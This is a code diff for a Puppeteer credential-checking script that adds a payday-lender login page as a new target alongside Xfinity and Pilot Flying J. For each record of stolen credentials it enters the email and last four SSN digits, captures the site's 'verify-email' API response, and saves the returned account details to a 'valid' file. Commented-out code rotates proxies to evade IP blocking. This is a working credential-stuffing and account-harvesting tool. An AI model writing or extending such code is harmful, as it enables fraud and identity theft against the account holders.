@@ -15,6 +15,7 @@ import {
 import path from 'path';
 import fs from 'fs';
 import logger from './logger/logger';
+import { MyFastCashUserResponse } from './interface/my-fast-cash';
 
 export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
@@ -41,6 +42,7 @@ interface PageConfiguration {
 interface ConfigurationPerPage {
   xfinity: PageConfiguration;
   pilotflyingj: PageConfiguration;
+  myfastcash: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
@@ -54,12 +56,19 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
+  myfastcash: {
+    pageUrl: 'https://myfastcash.com/login',
+    loanAmountSelector: '#amount',
+    formSelector: '#homepage-form',
+  },
 };
 
 const SELECTORS = {
-  emailInput: '#Email',
+  emailInput: '#email',
+  ssnInput: '#ssnLast4',
+  loanAmountInput: '#loan_amount',
   password: '#Password',
-  submitButton: '#loginForm > div > button',
+  submitButton: '#form-submit',
   userHint: '#user-hint',
   passwdHint: '#passwd-hint',
 };
@@ -135,21 +144,32 @@ export const getCredentialInformationScrapper = async (
 ) => {
   const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];
 
-  const HEADLESS = false;
+  // const HEADLESS = false;
 
-  let _browser = await pupeeteer.launch({
-    headless: HEADLESS,
-    // headless: false,
-    // args: ['--proxy-server=162.244.132.210:6021'],
-  });
+  // let _browser = await pupeeteer.launch({
+  //   headless: HEADLESS,
+  //   // headless: false,
+  //   // args: ['--proxy-server=162.244.132.210:6021'],
+  // });
 
-  // const page = await browser.newPage();
-  let page = await _browser.newPage();
+  const page = await browser.newPage();
+  // let page = await _browser.newPage();
 
   await page.setViewport({
     width: 1920,
     height: 1080,
   });
+
+  // await page.setRequestInterception(true);
+
+  // let response: MyFastCashUserResponse | null = null;
+
+  // page.on('response', async (interceptedResponse) => {
+  //   if (interceptedResponse.url().includes('api/verify-email')) {
+  //     response = (await interceptedResponse.json()) as MyFastCashUserResponse;
+  //     console.log({ response });
+  //   }
+  // });
 
   let ip = '';
 
@@ -157,40 +177,8 @@ export const getCredentialInformationScrapper = async (
 
   try {
     await page.goto(pageUrl, {
-      waitUntil: 'domcontentloaded',
+      waitUntil: 'networkidle2',
     });
-
-    // while (isInvalidIp) {
-    //   ip = await getIP();
-
-    //   isInvalidIp = await validateIp(ip, pageConfigKey);
-
-    //   if (isInvalidIp) {
-    //     console.log(`CURRENT IP: ${ip}`);
-    //   }
-    //   await _browser.close();
-
-    //   _browser = await pupeeteer.launch({
-    //     headless: HEADLESS,
-    //     // headless: false,
-    //     args: ['--proxy-server=162.244.132.210:6021'],
-    //   });
-
-    //   page = await _browser.newPage();
-
-    //   await page.setViewport({
-    //     width: 1920 / 1.5,
-    //     height: 1080 / 1.5,
-    //   });
-
-    //   await page.goto(pageUrl, {
-    //     waitUntil: 'networkidle2',
-    //   });
-
-    //   await new Promise((r) => setTimeout(r, 3000));
-    // }
-
-    // console.log('out of loop');
 
     const screenshotRedirectDirectory = path.join(
       `${__dirname}/data/screenshots-redirect/${validFileName}`,
@@ -212,35 +200,71 @@ export const getCredentialInformationScrapper = async (
 
     // await page.type(SELECTORS.firstNameInput, credential.name);
 
+    await page.waitForSelector(SELECTORS.emailInput);
     await page.type(SELECTORS.emailInput, credential.email);
 
-    await page.type(SELECTORS.password, credential.password);
+    await page.waitForSelector(SELECTORS.ssnInput);
+    await page.type(SELECTORS.ssnInput, credential.last4ssn);
 
-    // await page.type(SELECTORS.ssnInput, credential.last4ssn);
+    await page.waitForSelector(SELECTORS.loanAmountInput);
+    await page.type(SELECTORS.loanAmountInput, '1500');
 
-    await Promise.all([
-      await page.click(SELECTORS.submitButton),
-      await page.waitForNavigation({
-        timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
-        waitUntil: 'domcontentloaded',
-      }),
-    ]);
+    await page.waitForSelector(SELECTORS.submitButton);
+    await page.click(SELECTORS.submitButton);
+
+    const finalResponse = await page.waitForResponse(
+      'https://myfastcash.com/api/verify-email',
+    );
+
+    let response = (await finalResponse.json()) as MyFastCashUserResponse;
+
+    // console.log({ response });
+
+    // await Promise.all([
+    //   await page.waitForNavigation({
+    //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
+    //     waitUntil: 'domcontentloaded',
+    //   }),
+    // ]);
 
     await new Promise((r) => setTimeout(r, 800));
 
-    if (page.url().includes('home')) {
-      const outputMessage = generateOutputMessage(credential, page.url(), ip);
+    if (response && response.found && response.body) {
+      const userInformation = Object.entries(response.body)
+        .map(([key, value]) => `${key}=${value}`)
+        .join(' ');
+
+      const outputMessage = generateOutputMessage(
+        credential,
+        page.url(),
+        userInformation,
+      );
 
       logger.info(outputMessage);
 
       validWriteLineOnFile(outputMessage);
     } else {
-      const outputMessage = generateOutputMessage(credential, page.url(), ip);
+      const outputMessage = generateOutputMessage(credential, page.url());
 
       logger.error(outputMessage);
 
       invalidWriteLineOnFile(outputMessage);
     }
+
+    // if (page.url().includes('registration/returning')) {
+    //   //logic to validate if is good
+    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    //   logger.info(outputMessage);
+
+    //   validWriteLineOnFile(outputMessage);
+    // } else {
+    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    //   logger.error(outputMessage);
+
+    //   invalidWriteLineOnFile(outputMessage);
+    // }
 
     if (SCREENSHOT_DISABLED) {
       await page.screenshot({
@@ -260,6 +284,7 @@ export const getCredentialInformationScrapper = async (
       } || URL: ${page.url()}`,
     );
   } finally {
-    await _browser.close();
+    // await _browser.close();
+    await page.close();
   }
 };
